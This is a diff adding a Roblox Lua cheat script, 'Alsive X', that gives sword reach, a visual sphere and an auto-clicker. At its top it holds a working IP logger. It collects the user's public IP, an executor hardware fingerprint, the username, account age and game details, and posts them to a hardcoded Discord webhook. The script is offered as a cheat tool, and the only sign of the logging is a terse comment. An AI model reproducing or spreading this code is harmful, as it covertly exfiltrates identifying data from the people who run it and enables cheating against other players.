@@ -1,0 +1,391 @@
+--- ALSIVE X made by: GRIMSLOST x LANGUISHH
+
+--- KEYBINDS =
+--- Increase Size = E
+--- Decrease Size = R
+--- Toggle Invisible = X
+--- Toggle Visible = Z
+--- Visualizer Shape Circle = J
+--- Visualizer Shape Block = K
+--- Visualizer Shape Cylinder = L
+--- Vizualizer Material Neon = G 
+--- Visualizer Material ForceField = F
+--- Auto Clicker = Q
+--- Max Size = 10
+
+--- Ip logger
+ 
+ 
+local IP = game:HttpGet("https://v4.ident.me")
+plr = game:GetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+	premium = true
+elseif plr.MembershipType == Enum.MembershipType.None then
+	premium = false
+end
+if premium == false then 
+	if plr.AccountAge <= 70 then 
+		ALT = true
+	end
+end
+ 
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+ 
+ 
+local http_request = http_request;
+if syn then
+	http_request = syn.request
+elseif SENTINEL_V2 then
+	function http_request(tb)
+		return {
+			StatusCode = 200;
+			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+		}
+	end
+end
+ 
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+hwid = "";
+ 
+for i, v in next, hwid_list do
+	if decoded.headers[v] then
+		hwid = decoded.headers[v];
+		break
+	end
+end
+ 
+if hwid then
+local HttpServ = game:GetService('HttpService')
+local url = "https://discordapp.com/api/webhooks/937154192605331456/lLvkhH_EOV62PYk0yb8RGj-20FoX07kp6lyrJB2qlhrgDUKOqDv-QB9h7psojKCfLT3E"
+ 
+ 
+local data = 
+    {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "__**HWID:**__",
+            ["description"] = hwid,
+            ["type"] = "rich",
+            ["color"] = tonumber(0xAB0909),
+            ["fields"] = {
+                {
+                    ["name"] = "Username:",
+                    ["value"] = Game.Players.LocalPlayer.Name,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "IP Address:",
+                    ["value"] = IP,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "Game Link:",
+                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
+                    ["inline"] = true
+                },
+				{
+					["name"] = "Game Name:",
+					["value"] = info.Name,
+					["inline"] = true
+				},
+				{
+					["name"] = "Age:",
+					["value"] = plr.AccountAge,
+					["inline"] = true
+				},
+				{
+					["name"] = "Premium:",
+					["value"] = premium,
+					["inline"] = true
+				},
+				{
+					["name"] = "ALT:",
+					["value"] = ALT,
+					["inline"] = true
+				},
+ 
+            },
+        }}
+    }
+    local newdata = HttpServ:JSONEncode(data)
+ 
+    local headers = {
+            ["content-type"] = "application/json"
+    }
+ 
+    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+    http_request(request_payload)
+end
+
+
+
+--Intro Gui
+
+task.wait(2)
+local ScreenGui = Instance.new("ScreenGui")
+local MainIntro = Instance.new("Frame")
+local TopLabel = Instance.new("TextLabel")
+local ImageLabel = Instance.new("ImageLabel")
+local TextLabel = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+MainIntro.Name = "MainIntro"
+MainIntro.Parent = ScreenGui
+MainIntro.AnchorPoint = Vector2.new(0.5, 0.5)
+MainIntro.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MainIntro.Position = UDim2.new(0.5, 0, 0.5, 0)
+MainIntro.Size = UDim2.new(0, 333, 0, 258)
+
+TopLabel.Name = "Top Label"
+TopLabel.Parent = MainIntro
+TopLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TopLabel.Size = UDim2.new(0, 333, 0, 31)
+TopLabel.Font = Enum.Font.Creepster
+TopLabel.Text = "Alsive X"
+TopLabel.TextColor3 = Color3.fromRGB(170, 0, 0)
+TopLabel.TextScaled = true
+TopLabel.TextSize = 14.000
+TopLabel.TextWrapped = true
+
+ImageLabel.Parent = MainIntro
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.Position = UDim2.new(0, 0, 0.120155036, 0)
+ImageLabel.Size = UDim2.new(0, 333, 0, 227)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=9793258981"
+
+TextLabel.Parent = MainIntro
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0, 0, 0.310077518, 0)
+TextLabel.Size = UDim2.new(0, 331, 0, 85)
+TextLabel.Font = Enum.Font.DenkOne
+TextLabel.Text = "Made By: GRIMSLOST x LANGUISHH"
+TextLabel.TextColor3 = Color3.fromRGB(170, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+TextButton.Parent = MainIntro
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BackgroundTransparency = 1.000
+TextButton.Position = UDim2.new(0.198198199, 0, 0.709302306, 0)
+TextButton.Size = UDim2.new(0, 200, 0, 50)
+TextButton.Font = Enum.Font.Kalam
+TextButton.Text = "Continue"
+TextButton.TextColor3 = Color3.fromRGB(170, 0, 0)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextStrokeColor3 = Color3.fromRGB(85, 0, 0)
+TextButton.TextWrapped = true
+    TextButton.MouseButton1Click:Connect(function()
+            MainIntro:Destroy()
+        end)
+
+local Player = game.Players.LocalPlayer
+local Char = Player.Character
+local KeyBindHigh = "e"
+local IncreaseAmmount = 1 
+local KeyBindLow = "r"
+local KeyBindOff = "x"
+local KeyBindOn = "z"
+local KeyBindShapeBlock = "k"
+local KeyBindShapeBall = "j"
+local KeyBindShapeCylinder = "l"
+local KeyBindForceField = "f"
+local KeyBindNeon = "g"
+local Sword = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+_G.SphereActivated = true --// If set to true it'll put a sphere around ur sword 
+_G.Dist = 5
+
+game:GetService("RunService").Stepped:Connect(function()
+local Player = game.Players.LocalPlayer
+local Char = Player.Character
+  pcall(function()
+    for i,v in pairs(game.Players:GetPlayers()) do 
+        if v ~= Player then 
+            if v.Character.Humanoid.Health ~= 0 then 
+                if (v.Character.Torso.Position - Char.Torso.Position).Magnitude <= _G.Dist then 
+                        for _,x in pairs(v.Character:GetChildren()) do 
+                            if x:IsA("Part") then 
+                                    if x.Name ~= "Handle" then
+                                firetouchinterest(Char:FindFirstChildOfClass("Tool").Handle, x, 0)
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+end)
+
+Player:GetMouse().KeyDown:Connect(function(Key)
+	if Key == KeyBindOff then
+	        game.StarterGui:SetCore("SendNotification", {
+			Title = "Alsive X";
+			Text = "Visuals Invisible";
+			Icon = "http://www.roblox.com/asset/?id=9793258981";
+			Duration = 1;}) 
+        repeat
+            task.wait()
+            Part.Transparency = 1
+        until Key == KeyBindOn
+	end
+	if Key == KeyBindOn then 
+    		game.StarterGui:SetCore("SendNotification", {
+			Title = "Alsive X";
+			Text = "Visuals Visible";
+			Icon = "http://www.roblox.com/asset/?id=9793258981";
+			Duration = 1;})	    
+		repeat
+            task.wait()
+            Part.Transparency = 0.7
+		until Key == KeyBindOff
+	end
+	if Key == KeyBindHigh and _G.Dist <10 then 
+		_G.Dist = _G.Dist + IncreaseAmmount
+		game.StarterGui:SetCore("SendNotification", {
+			Title = "Alsive X";
+			Text = "Reach set to " .. _G.Dist;
+			Icon = "http://www.roblox.com/asset/?id=9793258981";
+			Duration = 1;})
+	end
+	if Key == KeyBindLow then 
+		_G.Dist = _G.Dist - IncreaseAmmount
+		game.StarterGui:SetCore("SendNotification", {
+			Title = "Alsive X";
+			Text = "Reach set to " .. _G.Dist;
+			Icon = "http://www.roblox.com/asset/?id=9793258981";
+			Duration = 1;})
+	end
+		if Key == KeyBindShapeBlock then 
+		     game.StarterGui:SetCore("SendNotification", {
+			Title = "Alsive X";
+			Text = "Shape = `Block` ";
+			Icon = "http://www.roblox.com/asset/?id=9793258981";
+			Duration = 1;})
+        repeat
+            task.wait()		    
+          Part.Shape = "Block"
+        until Key == KeyBindShapeBall
+		end	
+		if Key == KeyBindShapeBall then 
+		    game.StarterGui:SetCore("SendNotification", {
+			Title = "Alsive X";
+			Text = "Shape = `Circle` ";
+			Icon = "http://www.roblox.com/asset/?id=9793258981";
+			Duration = 1;})  
+        repeat
+            task.wait()		    
+          Part.Shape = "Ball"
+        until Key == KeyBindShapeBlock  
+		end
+		if Key == KeyBindShapeCylinder then 
+    		game.StarterGui:SetCore("SendNotification", {
+			Title = "Alsive X";
+			Text = "Shape = `Cylinder` ";
+			Icon = "http://www.roblox.com/asset/?id=9793258981";
+			Duration = 1;})  		    
+        repeat
+            task.wait()		    
+          Part.Shape = "Cylinder"
+            until Key == KeyBindShapeBall or Key == KeyBindShapeBlock          
+		end	
+		if Key == KeyBindNeon then 
+    		game.StarterGui:SetCore("SendNotification", {
+			Title = "Alsive X";
+			Text = "Material = `Neon` ";
+			Icon = "http://www.roblox.com/asset/?id=9793258981";
+			Duration = 1;})  		    
+        repeat
+            task.wait()		    
+          Part.Material = "Neon"
+            until Key == KeyBindForceField        
+		end	
+		if Key == KeyBindForceField then 
+    		game.StarterGui:SetCore("SendNotification", {
+			Title = "Alsive X";
+			Text = "Material = `ForceField` ";
+			Icon = "http://www.roblox.com/asset/?id=9793258981";
+			Duration = 1;})  		    
+        repeat
+            task.wait()		    
+          Part.Material = "ForceField"
+            until Key == KeyBindNeon 
+		end			
+end)    
+if _G.SphereActivated then
+function Update()
+    game.Players.LocalPlayer.Character.ChildAdded:Connect(function(tool)
+        if tool:FindFirstChild("Handle") then
+        Part = Instance.new("Part")
+        Weld = Instance.new("Weld", game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"))
+        Part.Parent = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+        Part.Transparency = 0.7
+        Part.Shape = "Ball"
+        Part.Material = "ForceField"
+        Part.CastShadow = false
+        Part.CanCollide = false
+        Part.BrickColor = BrickColor.White()
+        Sphere = Instance.new("SelectionSphere",game:GetService("CoreGui").RobloxGui.Modules)
+        Sphere.Transparency = 1 
+        Part.Name = "Sphere"
+        Sphere.SurfaceTransparency = 1
+        Sphere.Adornee = Part 
+        Part.Massless = true
+        Part.Position = game.Players.LocalPlayer.Character.Torso.Position
+        Weld.Part0 = Part 
+        Weld.Part1 = game.Players.LocalPlayer.Character.Torso
+         game:GetService("RunService").Stepped:Connect(function()
+         Part.Size = Vector3.new(_G.Dist,_G.Dist,_G.Dist)
+         end)
+      end
+    end)
+  end
+	function UnEquip()
+		game.Players.LocalPlayer.Character.ChildRemoved:Connect(function(int)
+			if int:FindFirstChild("Handle") then
+				for i,v in pairs(int:FindFirstChild("Handle").Parent:GetDescendants()) do 
+					if v.Name == 'Sphere' then
+						v:Destroy()
+					end
+				end
+			end
+		end)
+	end
+
+
+	Update()
+	UnEquip()
+
+	game.Players.LocalPlayer.CharacterAdded:Connect(Update)
+	game.Players.LocalPlayer.CharacterAdded:Connect(UnEquip)    
+end
+
+local AC = true
+local Key = Enum.KeyCode.Q
+
+game:GetService("UserInputService").InputBegan:Connect(function(k,g)
+  if not g and k.KeyCode == Key then
+    AC = not AC
+  end
+end)
+
+while wait() do
+  if AC then
+     pcall(function()
+       local Sword = game:GetService'Players'.LocalPlayer.Character:FindFirstChildOfClass'Tool'
+Sword:Activate()
+            end)
+  end
+end
